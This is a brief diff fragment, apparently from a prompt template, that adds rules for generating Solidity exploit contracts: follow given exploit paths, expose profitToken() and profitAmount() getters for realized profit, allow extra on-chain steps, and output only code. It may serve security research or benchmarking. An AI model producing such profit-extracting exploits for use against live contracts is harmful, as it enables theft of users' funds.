+5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
+6. expose `profitToken()` and `profitAmount()` getters for net realized profit
+7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
+8. output ONLY Solidity code
